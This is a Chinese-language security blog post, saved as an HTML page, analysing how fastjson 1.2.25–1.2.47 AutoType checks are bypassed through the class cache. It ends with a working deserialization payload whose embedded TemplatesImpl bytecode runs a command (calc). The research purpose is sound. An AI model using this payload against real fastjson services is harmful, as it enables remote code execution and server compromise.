@@ -1,0 +1,974 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mechoy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Fastjson Bypass0x00 前言看完fastjson的漏洞原理，接下来就是绕一下fastjson限制了，漏洞爆出来后，官方在1.2.25就已经修复了，但后面又陆陆续续的出来了很多绕过的方法，所以本文主要学习下绕过的思路和方法，下面主要以AutoType开启或关闭，然后再以版本为分类。AutoType开关是fastjson的一种安全机制，并不是打开或者关闭后就能够防止安全问题，其作用主要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson Bypass">
+<meta property="og:url" content="http://example.com/2022/11/19/FastjsonBypass/index.html">
+<meta property="og:site_name" content="Mechoy&#39;s Blog">
+<meta property="og:description" content="Fastjson Bypass0x00 前言看完fastjson的漏洞原理，接下来就是绕一下fastjson限制了，漏洞爆出来后，官方在1.2.25就已经修复了，但后面又陆陆续续的出来了很多绕过的方法，所以本文主要学习下绕过的思路和方法，下面主要以AutoType开启或关闭，然后再以版本为分类。AutoType开关是fastjson的一种安全机制，并不是打开或者关闭后就能够防止安全问题，其作用主要">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/2.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/3.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/4.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/5.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/6.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/7.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/8.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/9.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/10.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/11.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/12.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/13.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/14.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/15.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/16.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/17.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/18.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/19.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/20.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/21.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/22.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/23.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/24.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/25.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/27.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/26.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/28.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/44.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/29.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/30.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/31.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/32.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/33.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/34.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/35.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/36.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/37.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/38.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/39.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/40.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/41.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/42.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/43.png">
+<meta property="og:image" content="http://example.com/2022/11/19/FastjsonBypass/1.png">
+<meta property="article:published_time" content="2022-11-18T16:44:22.000Z">
+<meta property="article:modified_time" content="2023-05-08T16:05:15.533Z">
+<meta property="article:author" content="Mechoy">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/11/19/FastjsonBypass/2.png">
+  
+  
+  <title>Fastjson Bypass - Mechoy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Mechoy&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Fastjson Bypass"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Mechoy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-19 00:44" pubdate>
+          2022年11月19日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          26k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          133 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Fastjson Bypass</h1>
+            
+            <div class="markdown-body">
+              
+              <h2 id="Fastjson-Bypass"><a href="#Fastjson-Bypass" class="headerlink" title="Fastjson Bypass"></a>Fastjson Bypass</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>看完fastjson的漏洞原理，接下来就是绕一下fastjson限制了，漏洞爆出来后，官方在1.2.25就已经修复了，但后面又陆陆续续的出来了很多绕过的方法，所以本文主要学习下绕过的思路和方法，下面主要以AutoType开启或关闭，然后再以版本为分类。<code>AutoType</code>开关是fastjson的一种安全机制，并不是打开或者关闭后就能够防止安全问题，其作用主要是用于决定代码内的一些逻辑判断，具体的一些东西参见<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8140">FastJson checkAutoType安全机制研究</a></p>
+<h3 id="0x01-关闭AutoType"><a href="#0x01-关闭AutoType" class="headerlink" title="0x01 关闭AutoType"></a>0x01 关闭AutoType</h3><p>AutoType在默认情况下是关闭的，因此先来看AutoType关闭的情况</p>
+<h4 id="1-2-25-1-2-47"><a href="#1-2-25-1-2-47" class="headerlink" title="1.2.25 - 1.2.47"></a>1.2.25 - 1.2.47</h4><p>看一下改动代码，增加了个<code>checkAutoType</code>，并且<code>checkAutoType</code>返回的也是Class&lt;?&gt;，所以类加载的过程也是在<code>checkAutoType</code>中完成的，所以重点还是关注该方法</p>
+<p><img src="/2022/11/19/FastjsonBypass/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>先来看一下<code>checkAutoType</code>大概都做了哪些事情，这里面有个<code>autoTypeSupport</code>开关</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;<br>    ...	<span class="hljs-comment">// typeName不能为空</span><br><br>    <span class="hljs-keyword">final</span> String className = typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);	<span class="hljs-comment">// 替换内部类</span><br><br>    <span class="hljs-keyword">if</span> (autoTypeSupport || expectClass != <span class="hljs-keyword">null</span>) &#123;	<span class="hljs-comment">// autoType开启或者expectClass不为空时进入</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; acceptList.length; ++i) &#123;<br>            ... <span class="hljs-comment">// 白名单校验 通过则 TypeUtils.loadClass(),白名单默认为空</span><br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>            ... <span class="hljs-comment">// 黑名单校验 在黑名单中则 直接抛异常，黑名单见附录</span><br>        &#125;<br>    &#125;<br><br>    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);	<span class="hljs-comment">// 从缓存表中获取，防止重复加载该类，缓存表见附录</span><br>    <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">null</span>) &#123;<br>        clazz = deserializers.findClass(typeName);	<span class="hljs-comment">// 	当缓存表中没有该类时，查看该类是否已经有固定的反序列化器</span><br>    &#125;	<span class="hljs-comment">// fastjson中对某些类确定了反序列化器，当@type的值为对应类时，则直接调用该反序列化器，不再创建反序列化器</span><br><br>    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// 若从缓存表或者反序列器中找到了，则判断expectClass是否为空，以及clazz是否是其子类或实现类</span><br>        <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;...&#125;<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;	<span class="hljs-comment">// autoType默认关闭，所以进入这里</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;...&#125;	<span class="hljs-comment">// 黑名单</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; acceptList.length; ++i) &#123;...&#125;	<span class="hljs-comment">// 白名单</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (autoTypeSupport || expectClass != <span class="hljs-keyword">null</span>) &#123;	<span class="hljs-comment">// autoType或expectClass(期望类)不为空时进入类加载</span><br>        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-keyword">null</span>) &#123;	<span class="hljs-comment">// 基本上到这里就都能加载，或者抛出异常了</span><br>        ... <span class="hljs-comment">// 这里就是简单的抛异常了</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;	<span class="hljs-comment">// 这每太理解,也就是上面要是没加载成功，然后抛个异常？？？</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>大概的流程就是类似于如下形式：</p>
+<p><img src="/2022/11/19/FastjsonBypass/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>能够发现类加载并且成功返回的也就4个，能用的其实也就1个</p>
+<ol>
+<li>白名单，不能用，白名单默认为空（❎）</li>
+<li>缓存表中存在，若缓存表中能有恶意类，那这里也是能用的（✅）</li>
+<li>白名单，不能用，白名单默认为空（❎）</li>
+<li><code>autoTypeSupport || expectClass != null</code>为true时，首先<code>autoTypeSupport</code>为false，然后<code>expectClass</code>也是为空的（❎）</li>
+</ol>
+<p>解下来就是找能够操控缓存表的地方，在<code>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</code>中，有三处<code>mappings.put()</code>，粗略看一下，调用起来也都没有多大限制</p>
+<p><img src="/2022/11/19/FastjsonBypass/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>继续找在哪里调用了这个方法，<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code></p>
+<p><img src="/2022/11/19/FastjsonBypass/5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 删除了一些跟本文关系较少的东西</span><br><span class="hljs-comment">// clazz : 也就是@type指定的那个类</span><br><span class="hljs-comment">// fieldName : 用处不大，json中的那个key</span><br><span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-function">T <span class="hljs-title">deserialze</span><span class="hljs-params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;<br>    JSONLexer lexer = parser.lexer;<br><br>    Object objVal;<br><br>    <span class="hljs-keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;	<span class="hljs-comment">// 这个有点小看不懂了</span><br>        parser.resolveStatus = DefaultJSONParser.NONE;<br>        parser.accept(JSONToken.COMMA);<br><br>        <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;		<span class="hljs-comment">// 判断key是否为 &quot;val&quot;,也就是@type后面键值对的</span><br>     <br><br>        parser.accept(JSONToken.COLON);<br><br>        objVal = parser.parse();	<span class="hljs-comment">// 获取val后的value</span><br><br>        parser.accept(JSONToken.RBRACE);<br>    &#125; <span class="hljs-keyword">else</span> &#123;objVal = parser.parse();&#125;<br><br>    String strVal;<br><br>    <span class="hljs-keyword">if</span> (objVal == <span class="hljs-keyword">null</span>) &#123;	<span class="hljs-comment">// 赋值操作</span><br>        strVal = <span class="hljs-keyword">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (objVal <span class="hljs-keyword">instanceof</span> String) &#123;<br>        strVal = (String) objVal;<br>    &#125; <span class="hljs-keyword">else</span> &#123;...&#125;<br><br>    <span class="hljs-keyword">if</span> (strVal == <span class="hljs-keyword">null</span> || strVal.length() == <span class="hljs-number">0</span>) &#123;	<span class="hljs-comment">// 若strVal没有取到值就G</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    ...	<span class="hljs-comment">// 一系列的判断 判断clazz是否属于一些特定的类</span><br>    <span class="hljs-keyword">if</span> (clazz == Class.class) &#123;	<span class="hljs-comment">// 若clazz是Class.class类型，则调用TypeUtils.loadClass()</span><br>        <span class="hljs-keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());<br>    &#125;	<span class="hljs-comment">// 传入strVal,和配置里面的类加载器(这个通常是空)，但在后面会获取上下文类加载器</span><br><br>    ...	<span class="hljs-comment">// 同上，最后要是没有匹配到clazz的类型，则抛个异常</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/19/FastjsonBypass/6.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>缓存表中添加恶意类</p>
+<ol>
+<li><p>在<code>com.alibaba.fastjson.util.TypeUtils#loadClass()</code>中向缓存表中添加了类</p>
+</li>
+<li><p>在<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>中调用了该方法，并且该类是默认的反序列化器，在@type指定的类是一些特定类的时候会调用</p>
+</li>
+<li><p>在存在以val为key的键值对时，会获取该键值对的value作为<code>className</code>进行<code>loadClass(className)</code>并且将<code>mappings.put(className,clazz)</code></p>
+</li>
+</ol>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;a&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>    <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>该类作为恶意类，那么将该恶意类加入到缓存表中的形式就是这个样子喽，将该json字符串进行反序列化，查看几个关键点：</p>
+<p><img src="/2022/11/19/FastjsonBypass/7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/11/19/FastjsonBypass/8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/11/19/FastjsonBypass/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>来到<code>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</code></p>
+<p><img src="/2022/11/19/FastjsonBypass/10.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>当恶意类中加入缓存表之后：</p>
+<ol>
+<li>进入checkAutoType</li>
+<li>在缓存表中查找到了该恶意类</li>
+<li>直接返回该类的class，因为在加入缓存表时已经完成了该类的加载</li>
+<li>然后就是正常的fastjson反序列化</li>
+</ol>
+</blockquote>
+<p>后面这部分就和以前的一样了，所以就直接上payload了</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;a&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>    <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">&quot;b&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<br>    <span class="hljs-attr">&quot;_name&quot;</span>: <span class="hljs-string">&quot;Mechoy&quot;</span>,<br>    <span class="hljs-attr">&quot;_tfactory&quot;</span>: &#123;&#125;,<br>    <span class="hljs-attr">&quot;_bytecodes&quot;</span>: [<br>      <span class="hljs-string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhMQ2F0dGxlOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEAC0NhdHRsZS5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEABkNhdHRsZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAADQANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGgANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHwANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAQAAkAEwAMABEADQASABEAFAANAAAADAABAA0ABAAeAB8AAAAgAAAABwACTAcAIQQAAQAiAAAAAgAj&quot;</span><br>    ],<br>    <span class="hljs-attr">&quot;outputProperties&quot;</span>: &#123;&#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
